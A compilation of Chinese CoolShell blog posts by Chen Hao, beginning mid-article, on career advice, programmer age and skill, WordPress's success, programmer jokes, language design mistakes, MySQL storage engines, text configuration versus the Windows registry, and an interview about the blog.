3）做事情是要讲效率的。Amazon里喜欢使用一种叫T-Shirt Size Estimation的评估方法来优先做投入小产出大的“Happy Case”。关于什么是效率，什么是T-Shirt Size Estimation，你可以看看《加班与效率》一文 。4）需求总是会变化的，不要抱怨需求变化太快。你应该抱怨的是为什么我们没有把握好方向？老变？这个事就像踢足球一样，你要去的地方是球将要去的地方，而不是球现在的地方。你要知道球要去哪里，你就知道球之前是怎么动的，找到了运动轨迹后，你才知道球要去像何方。如果你都不知道球要去向何方，那你就是一只无头苍蝇一样，东一下西一下。**当你忙得跟牲口一样，你应该停下来，问一下自己，自己成为牲口的原因，是不是就是因为自己做事时候像就牲口一样思考？**#### 其它最后，我在给阿里今年新入职的毕业生的“技塑人生”的分享中，我给他们布置了5、6个Homework，分享几个给大家：1）重构或写一个模块，把他做成真正的Elegant级别。2）与大家分享一篇或几篇技术文章 ，并收获10-30个赞。3）降低现有至少20%的重复工作或维护工作4）拒绝或简化一个需求（需要项目中所有的Stakeholders都同意）
部署这些作业的原因，是我希望新入行的同学们对自己的工作坚持高的标准，我知道你们会因为骨感的现实而妥协，但是我希望你们就算在现实中妥协了也要在内心中坚持尽可能高的标准，不要习惯成自然，最后被社会这个大染缸给潜移默化了。因为你至少要对自己负责。 **对自己负责就是，用脚投票，如果妥协得受不了了就离开吧** 。芝兰生于空谷，不以无人而不芳！君子修身养道，不以穷困而改志！谢谢听我唠叨。（全文完）# Javascript程序员嘴最脏??作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn请看下图，我在Google Code上，针对每个程序语言都搜索了一下“fuck”一词的出现文件的个数X，以及没有出现fuck一词的文件的个数Y，然后放在Excel里求了一下百分比（X/(X+Y) * 100%），做了一个图。结果，JavaScript语言中出现的次数高达0.56%，名列全部语言之首，然后是Perl，C 和 PHP。（对于Javascript程序员的这种行为可以理解，因为IE，因为浏览器嘛，我就不多说了）!Google Code 中程序语言出现 fuck 一词的比率
相关的数据表格如下：!Google Code 中程序语言出现 fuck 一词的比率（全文完）# 编程能力与编程年龄作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn程序员这个职业究竟可以干多少年，在中国这片神奇的土地上，很多人都说只能干到30岁，然后就需要转型，就像《程序员技术练级攻略》这篇文章很多人回复到这种玩法会玩死人的一样。我在很多面试中，问到应聘者未来的规划都能听到好些应聘都说程序员是个青春饭。因为，大多数程序员都认为，编程这个事只能干到30岁，最多35岁吧。每每我听到这样的言论，都让我感到相当的无语，大家都希望能像《21天速成C++》那样速成，好多时候超级有想和他们争论的冲动，但后来想想算了，因为 **你无法帮助那些只想呆在井底思维封闭而且想走捷径速成的人** 。今天，我们又来谈这个老话题，因为我看到一篇论文，但是也一定会有很多人都会找出各种理由来论证这篇论文的是错的，无所谓了，我把这篇文章送给那些和我一样准备为技术和编程执着和坚持的人。目录* 论文     * 年龄分布图     * 能力和年龄分布图     * 年纪大的人是否跟不上新技术     * 结论   * 我的一些感受
#### 论文首先，我们先来看一篇论文《Is Programming Knowledge Related to Age?》（PDF链接），这篇论文是两个北卡罗莱纳州立大学计算机科学系的两个人Patrick Morrison 和 Emerson Murphy-Hill 对StackOverflow.com上的用户做了相关的数据挖掘得出来的一些数据。（我们知道StackOverflow.com上的数据是公开的，任何人都可以用来分析和统计，所以这篇论文的真实性是有的）数据采样和清洗条件如下：（数据全量是1694981用户，平均年龄30.3岁）* 15-70岁之间的用户（这年龄段的用户被称做“Working age”），当然，有很多用户没有输入年龄，这些用户都被过滤了。   * 用户在2012年内都回答过问题。因为StackOverflow在2012年对问题和答案的质量要求得比以前高了一倍，所以更能反映程序员的真实水平。   * Reputation声望在2-100K之间。（注：StackOverflow的用户Reputation是得到社会认可的，在面试和招聘中是硬通货币。比大学的学分更有价值）
上述的条件一共过滤出84,248名程序员，平均年龄：29.02岁，平均Reputaion在1073.9分。##### 年龄分布图下面我们来看一下他们的年龄分布图：我们可以看到程序员年纪的正态分布（高点在25岁左右，但是中点在29岁左右）##### 能力和年龄分布图然后，计算每个人每个月的Reputation，这样可以找到这个用户的真正的活跃时间，这样便于计算这个程序员的真实能力。（总声望 / 活跃时间），可以得到他平均每个月得来的Reputation。我们来看看程序员的能力和年龄段的分布图：（你可能会大吃一惊）上图中我们可以看到，程序员的能力在从25岁左右开始上升，一直到50岁后才会开始下降。所以说，程序员吃的不是青春饭。只有码农，靠蛮力，用体力而不是用脑力的程序员才是吃青春饭的人。##### 年纪大的人是否跟不上新技术论文的作者分析了Tag，用了最近5年内比较流行的技术Tag，然后用了一套比较严谨的算法来查看那些所谓的“老程序员”是否在新技术上跟上不了，所谓跟不上，也就是这些老的程序员在回答这些新技术上并不活跃。所谓老，就是37岁以上的程序员（就是我现在的年纪）。得到了下表：可以看到，老程序员和年轻的程序员对于一些新技术的学习来说也是差不多的，甚至有些项还超过了年轻的程序员。
##### 结论论文的结论是：**1）程序员技术能力上升是可以到50岁或60岁的。****2）老程序员在获取新技术上的能力并不比年轻的程序员差。**#### 我的一些感受最后，我说一说我的一些感受：* 这些年来的对于外企和国内感受—— **国外牛B的IT公司的工程能力并不见得比国内的要强多少，但是国外那些NB的IT公司的架构和设计能力远远超过国内的公司，最可怕的是，那些有超强架构和设计能力的“老程序员们”还战斗在一线，这些战斗在一线的老鸟的能力绝对超过100个普能的新手。*** 对年轻程序员的感受——国内新一代的程序员们太浮燥了。 **老实说，对于大多数人来说，如果你没有编程到30岁，你还不能成为一个“合格”的程序员** 。 **所以，并不是编程编到30岁就玩完了，而是编程编到30岁才刚刚入门。** 这些不合格的程序，整天BS这个不好，那个不好的，而且喜欢速成，好大喜功。* 我是一个奔四的人了，编程就像登山一样，越往上爬人越少，所以，在我这个年纪还有想法，对编程还有热情的人不多了，基本上都是转Manager了。 **其实，什么职位，Title都是虚的，公司没了什么都没了，只有技术才是硬通货。而且，越是这个年纪还在玩编程玩技术的人，其实其经验和能力都是比较强的，都是中坚力量，如果还有其它这个年纪和我一样的人，求交往** 。
（全文完）# WordPress是怎么赢的？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn一个以前在Six Apart工作4年的产品经理 **Byrne Reese** 发布了一篇文章阐述为什么WordPress成为了赢家。其在文章中比较了WordPress和其主要竞争对手产品Movable Type。我觉得其中有可取之处，本想全文翻译的，后来觉得文章太长，翻译太花时间，所以，我把文章中的观点总结如下。作者例举了如下为什么WordPress会赢的理由：**一、Movable Type许可证，而WordPress是开源的**2004年，Movable Type修改了其许可证，这一举动激怒了所有Movable Type的用户，于是大家纷纷转投Wordpress，这是WordPress最终成为赢家最大的原因。就算是Movable Type有着优越的设计，优越的功能，还有优越的技术支持，但是面对的是一个完全免费的产品也没有办法。因为WordPress是开源的，开源就意味着完全免费，而Movable Type一开始也是免费的，但是其许可证策略有着很不确定的因素。（注：2007年Movable Type发布了开源版本）
**二、WordPress很容易安装**WordPress的安装过程很简单，只需要不到5分钟，比起Movable Type来说，这太受用户和推广商欢迎，你几乎不需要去碰后台的那些Web设置。（注：不仅如此，WordPress的升级和安装插件和风格的用户体验也是非常的不错）这就是为什么大家都喜欢WordPress的原因，就算是其功能比Movable Type少了又少。**三、WordPress由PHP写成**作者说到，本来，语言不应该成为原因，绝大多数用户在使用新产品时是不会去自己修改PHP和Perl的源码的。但是好像人们对PHP有着天生的好感。相比起Movable Type的Perl，人们似乎没有像对PHP那样觉得舒服。Perl让人感觉有些害怕。而PHP让更多的人参与进来为WordPress贡献了大量的插件和风格。另外，PHP相对于Perl来说，对于工作的技能要求不高，所以，可以很容易维护。对于技术人员来说，会有更多的人去建议老板使用PHP而不是Perl，而更多的主机空间采用PHP而不是Perl。（我个人以为，这和WordPress的设计关系可能更大，所有的Blog系统，WordPress的可定制化支持得更好一些）
**四、WordPress的社区规模相当的大**WordPress之所以那么成功，有一个因素要归结于其社区，这个社区创造力实在是很强大。而且，这个社区周边有一个健康的经济商圈——“Premium Theme”，越来越多的人可以从中挣到一些钱，这样也让他们更有动力回报这个社区，这是一个非常健康的良性循环。**五、WordPress没有人进行强控制**对于WordPress来说，上述的那些事情都是社区决定的，而不是WordPress内部的人，WordPress没有选择过其许可证和编程语言。**六、WordPress的狂热崇拜**在一开始，WordPress并没有把自己定位在超出自己能力的地方，其把自己定位在不是那么优越的地方。低调的策略让WordPress的口碑不错。另一个因素是因为，Six Apart曾对WordPress进行过诽谤，这让Six Apart的诚信受到质疑，因此反而让人们更加地喜欢WordPress。再加上WordPress的谦虚低调，于是人们对WordPress产品产生了感情以及信仰，并开始和WordPress一同作战。是的，Six Apart不是一个竞争对手，而是一个完美的敌人。
**七、Automattic的切换战役**Automattic是WordPress的运作公司。这是一个并不是很光彩的事情。作者说，有很多忠诚的Movable Type和TypePad用户向他透露到有来自Automattic的员式打电话给他们让他们切换到WordPress上，如果这样的人每人给他一美金，他会相当的富有。Automattic用尽一切办法和手段让用户切换到WordPress上，他们甚至给这些用户免费提供主机服务，还分配一个工程师给用户帮他们迁移系统。而当有用户迁移了，他们则制造一个成功的案例来鼓动别的用户。**八、Six Apart 收购 Apperceptive**Six Apart收购Apperceptive并没有错，而且还有很不错的利润增涨。问题是，收购以后，Six Apart从其社区中雇佣了很多很聪明的也有创造性的人到他的公司里。然后这些人加入后，其吞食了本来Six Apart以专业注称的服务。更糟糕的是，这个做法等于削弱了其社区的力量，社区里缺少领袖级的人物，于是只有Six Apart在战斗。**九、Six Apart 自己的失败**作者归结为一点：Six Apart严重地阻碍了自己的竞争力，因为其把自己的精力分布在了很多产品上。简而言之一句话——没有专注。如果Six Apart专注地做一个事，比如就做TypePad 或是 Movable Type，那么，今天的情况可能会很不一样。虽然，WordPress还是无可质疑地会成为最流行的Blog，但是他依然会面对着强大的对手，双方需要不停地在创新和技术上比拼。
最后，作者说，目前这个世界上有WordPress, Drupal, Expression Engine, Movable Type, Simple CMS, TypePad, Twitter, Instagram, Tumblr,或是其它东西。作者让大家扪心自问——“是否WordPress是最好的产品？”作者依然认为 Movable Type 是最好的产品。其今天还是成为了很多商业公司的首选。——————————我个人觉得Blog的用户群其实对Blog的需求其实并不多，只需要可以发布文章，有评论，可以在边栏上添加一些小饰件，可以改变一下样式，最好自己的文章有人帮着做做推广什么的，基本上就是这个样子。所以，像新浪，搜狐这样提供商其实更好。更多的用户是不会去搭建自己的专有的blog的。所以，能自己搭建自己的blog的这群人，还是以技术人员偏多，而WordPress正好满足了技术人员的胃口。（老实说，WordPress的后台操作对于非技术人员的电脑用户来说还是很不够友好——太复杂，性能上好像也不是很好，插件多是多，但好的插件就那么几个）（全文完）# 程序员的相关笑话（二）作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cn前面发表过《程序员的相关笑话（一）》现在继续一些相关的笑话。目录* 牧羊人与IT顾问   * 程序员睡觉   * 一个程序出错信息   * 为什么程序员喜欢UNIX   * Google递归关键字   * 一句话幽默#### 牧羊人与IT顾问从前，有一个牧羊人，他有很多的羊。一天他赶着他的那群羊到了一条公路边上。突然，有一辆保时洁急驶过来，上面坐着一个年轻人人，穿着Armani的衣服，和Cerutti的皮鞋，Ray- Ban的太阳眼镜，TAG-Heuer的手表，以前Versace的领带。他走到牧羊人面前问牧羊人：“如果我能说出你有多少只羊，你能给我一只吗？”牧羊人看了看他那一大群数都数不过来的羊，说：“可以！”。那个年轻人，于是打开了他的笔记本电脑，接上手机，进入了NASA Webster，通过GPS定位，开始扫描。然后打了40多页充满各位对数微积分的公式的Excel表格，最后通过他的那个高科技迷你打印机打出了150多页的分析报告，然后，他看了看报告，走到牧羊人前说：“你一共有1586只羊！”牧羊人拍手道：“牛啊，你说的一点也没错，你挑一只吧”。
于是，那个年轻人挑了一只，并准备从他的保时捷中拿出一些文档给牧羊人，这时，牧羊人说：“如果我能猜出你是干什么的，我能不能要回我的那只羊？”年轻人说：“为什么不呢？”牧羊人说：“你是一个IT咨询顾问”年轻人说：“你是怎么知道的？”牧羊人说：“很简单。首先，我并没有叫你，你就来了。然后，你开始用一些我已经知道的东西向我收费。第三，你根本就不了解我的业务……，所以，现在请你把我的牧羊狗还给我。”#### 程序员睡觉一个标准的程序员在睡觉时候都会准备两个杯子，一个是空的，一个装满了水。装满水的杯子为的是可能自己的睡觉的过程中会口渴，空白杯子只是为了在睡觉的时候不口渴。#### 一个程序出错信息Keyboard not found … press F1 to continue#### 为什么程序员喜欢UNIXunzip, strip, touch, finger, grep, mount, fsck, more, yes, fsck, fsck, fsck, umount, sleep（ **说明** ：unzip：拉开拉链；strip：脱掉衣服；touch：抚摸；finger：手指；grep：摸索；mount：骑上去；fsck：fxxk；more：更多；yes：爽；umount：下来；sleep：睡觉）
#### Google递归关键字http://www.google.com/search?hl=en&q=recursion#### 一句话幽默C++是一个很好的编译语言，因为你的parent（父母）不能访问你的private（隐私），但是你的friend（朋友）可以。这个世界上，最佳的UI设计是“乳头”，除此之外，所有的UI都需要学习。我真的想让这个世界变得更好，但是他们不给我源代码。（RE：这个世界的源代码是COBOL或汇编）程序员是一种可以把香烟和咖啡变成代码的机器。有多少微软的工程师会换电灯泡？没有，他们会把黑暗变成一种标准，然后对你说，这就是设计行为。（全文完）# 五个编程语言设计的失误作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在近几年来，编程语言的设计正在经历着类似于“文艺复兴”的过程，这么说主要是基于下面两个事实：1）多核技术推动着PC消费者更多的关注并行程序。2）动态语言的性能越来越好，其性期已经可以足够用来实现互联网服务，并且它们正在走出“脚本语言”阴影。这篇文章试图收集最重要的编程语言的设计错误，以便让那些程序语言设计者们在设计新型的编程语言时避免。我避免了一些纠缠不清的有好有坏的问题，如：动态类型或是静态类型。我也省略了那些看起来并不严重，很容易被修改的错误。例如，加入“参量”（Parametric Type），这在Java中已经有了。Sun在发布Java 1.0版后的第八年才加入了这一功能。还有一个最近的例子是 Google Go Language Design FAQ 中说到的：: “Generics may well be added at some point. We don’t feel an urgency for them, although we understand some programmers do.”
### 0\. Null 指针几乎在所有的主流编程语言中，对一个对像的引用可能会是一个空指针，这个错误会引发运行时错误。 C.A.R. Hoare 最近声明向这一“发明”负责，尽管如此，其它许多的设计者们都应该对这样的设计受到批评。下面是 C.A.R Hoare 的“忏悔”：> I call it my billion-dollar mistake. It was the invention of the null > reference in 1965. […] More recent programming languages like Spec# have > introduced declarations for non-null references. This is the solution, which > I rejected in 1965. – C.A.R. > Hoare > > 我把它叫做“亿万美元错误”。这个空指针的发明创造来自1965年。…… 现在的编程语言引入了“非空引用”的声明规格。这个方案被我在1965年给拒绝了。其它语言，如 C/C++ 更夸张，它们在运到这样的错误时，直接Crash掉，而 Java， Python 和其它语言会抛出一NullPointerException异常，但问题是，这个 RuntimeException 可能会被几乎所有的语句抛出。其实，只需要一个静态类型的语言就可以保证不会出现空指针或空引用。例如： Cyclone 是一个安全的C变种，其引入了非空指针和指针运算的限制。
一些语言甚至让你根本不可能创建空指针，虽然这使得明确的指针不能行进行运算。Haskell 就是这样的一个语言，其提供了Maybe Monad，其强制程序员考虑“Null”的情形。### 1\. 很难解析的语法编程语言的语法应该来自 LALR 或是更好的 LL(1)。今天的程序员需要适当的工具来支持其开发语言，也就是我们常说的IDE，编译器或是其它可以帮你解析程序语言的编程工具。这并不会出现在一个单一的前端。也许，多重编译器已经被实现出来了。这可能让我们的开始变得更容易一些。然而，我们现实中的一个反例是 C++，几乎没有哪个C++的编译器可以把C++这个语言完美地正确地解释出来，而且不同C++的编译器的行为如此的诡异。编程语法的开销是微不足道的，程序员应该在编写程序中享有更快速和高效的回报。### 2\. 未定义的语义别在语言规格中说“实现规范”！尽可能的少使用“未定义”这样的术语来描述语言的行为（C/C++中出现了很多undefined的行为）！黄金准则是StandardML，其是一个完整地正式的语义。C 语言是这样一个反例，其规则中有太多太多的未定义的情况。然而，由于其广泛使用，所以某些行为的定义已经成为了世界的共识（江湖的行规，或，潜规则）。 举个例子，在C中，整型 overflow 的行为是未定义的，而编译器也是有能力推断出“ `x < x+1` ”是否总是为真。不幸的是，这个本来是编译器应该干的事，交给了程序员，于是在C的世界里，出现了大量的整型溢出的代码。而当整型溢出的时候，几乎所有的行为都是像x86处理器一样（如： `maxint+1 == minint）。`
明确的语义可以让验证和错误检查更容易。虽然，软件校验来得比缓慢，但一定会来。我可以想像，编程语言的下一个机会将会是更容易地校验，这可能需要十到二十年的时间，但今天开始这样做的语言将会在那天成为世界的主流。### 3\. 坏的Unicode 支持程序中几乎都要处理字符串，但别忘了并不是所有人都会使用英语来编程。今天，几乎所有的编程语言都不支持Unicode，所以，我们只能使用ANSI的英语来编程。这个时代， 程序员应该使用Unicode 来编程，所以，源代码也可以声明其用什么来编码。在文本和字节序间的转换和区分在的标准库方面会比语言方面更是一个问题，当然，这也影响了语法。读一读 Python 3 是怎么解决这个问题可能会更有一些帮助。### 4\. 预处理器像C++和MP4的预处理器已经被广泛地使用着，使用预处理器更像是一种hack而不是一个干净的解决方案。 他们被用来，使用外部文件（如头文件，但确没有正确地模块机制），使用条件编译，宏替换，等。把这些功能与编程语言集成起来一起使用可以增加程序的性能和开发效率，并没有什么不好的地方。##文章：来源# MySQL: InnoDB 还是 MyISAM?
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnMyISAM 是MySQL中默认的存储引擎，一般来说不是有太多人关心这个东西。决定使用什么样的存储引擎是一个很tricky的事情，但是还是值我们去研究一下，这里的文章只考虑 MyISAM 和InnoDB这两个，因为这两个是最常见的。下面先让我们回答一些问题：* 你的数据库有外键吗？   * 你需要事务支持吗？   * 你需要全文索引吗？   * 你经常使用什么样的查询模式？   * 你的数据有多大？思考上面这些问题可以让你找到合适的方向，但那并不是绝对的。如果你需要事务处理或是外键，那么InnoDB 可能是比较好的方式。如果你需要全文索引，那么通常来说 MyISAM是好的选择，因为这是系统内建的，然而，我们其实并不会经常地去测试两百万行记录。所以，就算是慢一点，我们可以通过使用Sphinx从InnoDB中获得全文索引。数据的大小，是一个影响你选择什么样存储引擎的重要因素，大尺寸的数据集趋向于选择InnoDB方式，因为其支持事务处理和故障恢复。数据库的在小决定了故障恢复的时间长短，InnoDB可以利用事务日志进行数据恢复，这会比较快。而MyISAM可能会需要几个小时甚至几天来干这些事，InnoDB只需要几分钟。
您操作数据库表的习惯可能也会是一个对性能影响很大的因素。比如： COUNT() 在 MyISAM 表中会非常快，而在InnoDB 表下可能会很痛苦。而主键查询则在InnoDB下会相当相当的快，但需要小心的是如果我们的主键太长了也会导致性能问题。大批的inserts 语句在MyISAM下会快一些，但是updates 在InnoDB 下会更快一些——尤其在并发量大的时候。所以，到底你检使用哪一个呢？根据经验来看，如果是一些小型的应用或项目，那么MyISAM 也许会更适合。当然，在大型的环境下使用MyISAM 也会有很大成功的时候，但却不总是这样的。如果你正在计划使用一个超大数据量的项目，而且需要事务处理或外键支持，那么你真的应该直接使用InnoDB方式。但需要记住InnoDB 的表需要更多的内存和存储，转换100GB 的MyISAM 表到InnoDB 表可能会让你有非常坏的体验。文章：来源# 纯文本配置还是注册表作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们知道Unix/Linux下的程序配置文件从来都是纯文本的，你可以自由地修改和查看，他们也没有什么什么XML之类的玩意（参看XML的这两篇文章：一，二），这个最重要的Unix文化（参看Unix传奇下篇")）40多年来就这么沿续下来了。我很佩服Microsoft的创新能力，一会儿用INI，一会儿用注册表，一会又是用XML，这就是Windows的编程中那“强大”的创新。在网上又看到有人在争论为什么用注册表而不是纯文本，所以，写下这篇文章。
目录* 引入注册表所谓的原因   * 我的观点   * 纯文本配置文件的好处   * 真正的原因#### 引入注册表所谓的原因首先，让我们来看一下为什么微软觉得要使用注册表而不是ini文件，下面是一些其列出来的ini方面的毛病：* ini文件不支持Unicode   * ini文件的安全权限不够   * ini文件在多进程下存取会有问题   * 如果一个进程锁上了这个文件，另一个进程就无法获得，只能出错。   * ini文件只能包含字符串，无法使用二进制   * 解析ini文件相对来说性能比较慢，第一次读写都需要把整个文件读入内存，然后再写回去。   * ini文件最大只有32K   * ini文件的默认目录在Windows系统目录下，只能这个目录只能Windows管理员才能访问   * ini只能包含了两层，对于多层不支持。   * 把ini文件放在中央服务器上管理很困难。而微软说，注册表可以完美地解决这些问题。居然微软只说到了ini文件，但我觉得不单单是ini，所有的以纯文本方式保存配置文件的方法都会出现上述这样的问题。#### 我的观点那么，当你在看到这些言论时，你是怎么想的？你有没有经过自己的独立思考？还是你觉得注册表完美地解决了所有的一切？下面是我的一些观点：
* 首先，我们要知道没有任何一件事是完美的，凡事必然有好的一面，也有不好的一面。   * 其次，当我们在改进一个东西时，不单单要解决其不好的东西，还要把其好的东西给传承下来。所以，当你看到一些只说好或是只说坏的东西时，这往往意味着“宗教”或“洗脑”，这正是需要你独立思考的时候。#### 纯文本配置文件的好处下面，是我觉得纯文本配置文件的好处（我用Unix下的纯文本配置文件来举例）：* 很容易进行版本管理（配置文件和程序代码一样都需要版本控制）   * 很容易移植到别的平台   * 很容易自定义文本文件的格式和语法，已也有相关的库支持（ini只支持ANSI字符，只有32K，只支持两级，那是ini的问题，解决这些问题不需要引入注册表）   * 可以在配置文本中写注释信息   * 你要很容易的使用grep，awk，sed等等以及来和脚本集成。   * 你可以很容易地拆分配置文件把其放到conf.d中，这样一来，你就非常灵活      * 你就不用整个文件都读入内存，     * 你也可以分别设置上不同的存取权限，     * 同样可以减小多个进程同时存取的问题     * 同样可以引用别的二进制配置的文件   * 你可以很容易地产生备份或是在不同的配置中来回地切换配置文件以进行调试。   * 你可以很容易地使用rsync来向中央服务器同步你的配置文件。或者使用NFS/NIS直接就把配置放在中央服务器上。
#### 真正的原因可见，Windows 的注册表并没有把纯文本配置文件的这些好处都带过来，所以，经过这样的独立思考，我们可以知道，微软引入注册表的真正原因是——* 让你的程序不具移植性，让你的软件永远运行在Windows上。   * 增加你编程的复杂度和你维护配置文件的复杂度，让你在痛苦之后，苦苦哀求微软再发布下一个“创新”。各位程序员——Windows是很危险的，你们还是回火星去吧。（ **全文完，转载时请注明作者和出处** ）# InfoQ的ArchSummit大会对我的采访作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn偷个懒，做个更新，今天下午InfoQ的ArchSummit对我的一些采访。我整理了一下，算做是我个人写酷壳的一些想法和总结。不过问我的这些问题并不尖锐，呵呵，不像@图灵谢工 问我的问题：“你的价值观太过理想，根本不现实，你站在道德的高点拷问社会，是不是想炒作自己？”。**1) 作为酷壳的博主，请您大概介绍下酷壳是什么时候开始的，初衷是什么 ？**我写blog是从2002年开始（那时还没有blog这个词），当时对我来说，没有自己的电脑，上网很不方便，而我有写学习笔记的习惯，读书和工作中学到的一些东西需要保存在某个地方，我希望这个地方可以让我在任何地方都可以调出来看看（因为我当时的工作出差太多），正好当时的CSDN有个“专家专栏”的功能，也就是后来出现的blog。
后来Blog出现后，CSDN把自己的“专家专栏”全部迁移到了blog.csdn.net上，07-08年这段时间，CSDN的blog基本上是不能使用，性能差得不能再差，每天宕机，上传图片，贴代码，都非常不好用。也许，这就是使用.NET/Windows平台的问题（开个玩笑）。我是从2009年3月开始创建酷壳的，创建的初衷如下：* 我需要一个更稳定，更方便的地方，我的博客的风格不会被大众的风格所掩盖的地方。   * 我的从事新闻的老婆很不待见我在CSDN的博客，她觉得太技术，书呆子。   * 我正好看到了煎蛋这个国外娱乐新闻文摘的blog，而我正好每天会有2个小时阅读国外社区的东西。基于上述三个原因，我自己花了4500元/年租了个主机，建了酷壳。所以，这也是你一开始看到酷壳基本上是娱乐性比较强的博客，我收集一些比较有意思的程序员中发生的事情，也收集一各式各样的程序员圈子里的各处观点。我当时的想法是，一些特别技术的东西，我会和CSDN同步，而一些轻松的话题，我会放在酷壳。我当时的初衷就是想说明程序员并不是一个木纳、书呆子、不食人间烟火、巨无趣的一个群体，程序员圈子里同样也有很多有趣的东西。所以，你可以看到11年初以前的东西我有很多网络恶搞式乱调侃的语言。
但到了2011年初让我开始让我有些转变，主要是读者越来越多，而且，有一些人已经把酷壳当成了一个提升自己能力和、开阔眼界、甚至需要指导的地方，我的压力就这样来了，这种压力让我开始不能太娱乐，因为有一些人是很认真地在看酷壳的文章，在期待能从酷壳获得有价值的东西……**2）技术人员的个人博客不胜其数，但真正可以吸引人眼球的并不多，能谈谈成功运营一个个人博客的精髓是什么？**哪有什么运营，完全是顺其自然，误打误撞。是的，技术人员的博客太多了，酷壳并不是技术最好的，也不是资讯最好的。淘宝的很多技术团队的博客都很不错，还有阮一峰的博客，还有各种各样的如CSDN，博客园，51CTO，ZDNET这样的社区。所以，我需要做点不一样的，而且我觉得还有一些这些社区和博客都还没有涉及的地方。对于社区最大的问题就是，他们就像我们学校里的学生一样，喜欢大量地收获聚集文章和知识，填鸭式的网站，网站的编辑不懂技术。对于一些技术博客的问题并不是他们不懂技术，而是太过技术，只有技术，少了一些程序员的文化，观点和视野。程序员是一个圈子，一个小社会，这个圈子里并不只有技术和知识，还有很多很多的东西，例如：程序员们都说自己比较辛苦，都说自己没有得到足够的尊重，还有一些如敏捷，流程，产品等地方程序员的观点没有得到表达，还有一些程序员这个社区内比较特有的东西，比如：编程语言之争，这本是一个很好的话题，是程序员圈子里的文化，但是每次讨论都是骂来骂去的，需要有人去引导程序员，带领他们用正确的价值观去看待和思考这些东西。
这就是酷壳和其它博客和社区不一样的地方，我关注的并不只有技术，还有程序员的文化和想法，并且输出一些或偏执或鲜明或个人或激进的价值观，无论怎么样，你认同也好，不认同也可以，你可以看到酷壳和我还有酷壳里的讨论都是真实的。**3）根据你博客的自我介绍，想从纯底层技术方向转型为业务技术方向，让你产生这种想法的最大原因是什么？**纯底层做得太多了，有些书呆子了，与人打交道有问题了，而且觉得地底有点不识人间烟火了，我想知道用户是怎么用我们的产品的，我想知道用户是怎么想的，整天在那调网络性能，调系统性能，搞多线程，搞内存漏洞，整天在矿道里打洞， 想出来见见天日。呵呵。但这并不代码我觉得业务和用户要比技术有用得多，也并不是说技术无用论。我觉得这就好像一颗大树，这些底层的技术，可以让你站得非常非常稳，可以让你抵御洪灾和暴风，但是如果你想伸长得更高更广，你还是需要地面上的枝叶。我觉得我的底层知识够深入了，我需要了解业务知识和用户，因为我不但想站得稳，扎得深，我也想伸得高。**4）酷壳产出文章是怎么样的频率？每篇博文 ，你大概需要多少时间？**我每天都有阅读的习惯，尤其是阅读网文，每天两个小时，而且我是一个爱思考的人，思考的对不对不一定，但是我很喜欢去思考。现在又上了微博和一些朋友互动，也会引发我的一些思考，所以，文章就是在阅读、交流和思考中产生的。
2011年初以前，平均每周3篇，有时候一周有10篇，现在基本上每周一篇。以前的文章花不了太多时间 ，因为比较娱乐，现在的文章很花时间，比如《程序员练级攻略》花了我四周的时间 ，《性能调优攻略》花了我三周多的时间，基本上来说，现在的文章至少也要花我1-2天的时间。我想把文章的数量降下来，这样，我可以思考得更好更透彻一些，这样文章里的营养更多一些。**5）是不是可以给年轻的朋友，或是风刚从事软件开发工作的朋友，一些职业发展的建议？**主要是下面几点：* 不要追新技术，应该多看看那些经历了很长时间的常青的技术。* 多研究一下历史，和技术的演进，这样你才能知道技术的未来。今天的很多东西都在过去有身影，如：今天的移动端和云端架构和以前的Unix和终端的关系，还有管道，和Unix设计的哲学也在今天Service Interface式的设计中有得到传承，等等。* 我可以急功近利以解决问题和追赶技术潮流，但是，如果你需要成为一个领域的专家，你需要非常非常注重基础。速成编程的方式只能让你成为劳动力，而不能成为工匠或技术和知识的驾驭者。* 不要被产商的文化所主导了，多看看社区的文化，尤其是Unix/C的文化，这是计算机文化的根（参看我写过的《Unix传奇")》）
* 注重基础，广度是深度是副产品。**6）以你过往的经历，你是如何看待“架构师”这个角色的？他的义务是如何分配的？**架构就是Design一个部分，就是软件设计的一块，软件设计最重要的有两点：* 业务功能性需求分析和非功能性需求分析，   * 技术基础的深刻认识，需要有非常丰富的经验。试问一下，程序员做软件不需要设计吗？做设计不需要设计架构吗？很自然的，今天的工程师，程序员已经在做架构设计上的事了。所以，我觉得架构设计这个工作本就是程序员（或者说是高级程序员）工作的一部分。但是，我个人认为架构师在某些情况下也还是需要的，但其应该是对业务和技术都很熟悉的人，并且偏技术，也要写代码的人。在一些公司，上下一盘棋，的确需要对总体架构设计，并保证这个框架能够被各个工程团队贯彻实现的那么一个团队，但他们应该更多地深入到一线工程团队的。所以，我觉得架构师就是一个高级程序员，而不是一个拍脑袋，关说不练的人。这点，看看Linux的架构师团队就知道了，一样的需要写代码，fix-bug，一样地需要了解各个公司对linux提出的各种各样的需求。**7）现阶段酷壳的文章，都是你一个人写的吗？是否有其他同仁加入写作？**
并不都是我一个人写的，我希望酷壳是大家一起来写的，事实上也有一些人写，只是不多。只是我个人的色彩过重了一些，我的个性压制了众性。（不过，我真的无法自证都是我写的，我有没有团队，呵呵，管它有没有团队，是不是人代写，重要的是那些文章的内容是否对大家有帮助，或是对社区有贡献。；））**8）你对酷壳未来的构想是什么？还是一个技术交流的平台吗？**对于酷壳来说，其文化和价值观比较重一些，短期内，还是以我个人色彩为主一些，虽然我希望这是一个大家都能来分享的地方。前段时间我有个想法想做一个“程序员疫苗站”，就像我们一出生时接种的各种疫苗可以让我们抵抗各种病毒一样，这个网站可以让程序员接种一些犯低级错误的疫苗，从而对这些低级错误有抵抗。我还没有想得特别清楚，不过方向基本上是这个方面的。（全文完）# 你应该知道的20个Ajax技术(11-20)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**11) 